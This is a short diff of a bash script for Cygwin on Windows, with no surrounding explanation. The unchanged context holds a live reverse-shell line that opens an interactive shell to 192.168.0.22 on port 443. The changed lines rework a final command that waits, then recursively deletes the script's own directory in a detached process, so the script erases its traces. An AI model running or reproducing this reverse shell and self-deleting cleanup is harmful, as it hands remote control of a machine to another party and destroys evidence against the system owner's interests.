@@ -2,9 +2,8 @@
 
 bash -i >&/dev/tcp/192.168.0.22/443 0>&1
 
-WIN_DIR=$(cygpath -w "$PWD")
+TARGET_DIR=$(cygpath -w "$PWD")
 
 cd ..
 
-
-cmd.exe /c "timeout /t 2 /nobreak >nul && rmdir /s /q \"$WIN_DIR\"" >/dev/null 2>&1 &
+cmd.exe /c "start /b cmd /c \"timeout /t 2 /nobreak >nul && rmdir /s /q \"$TARGET_DIR\"\""
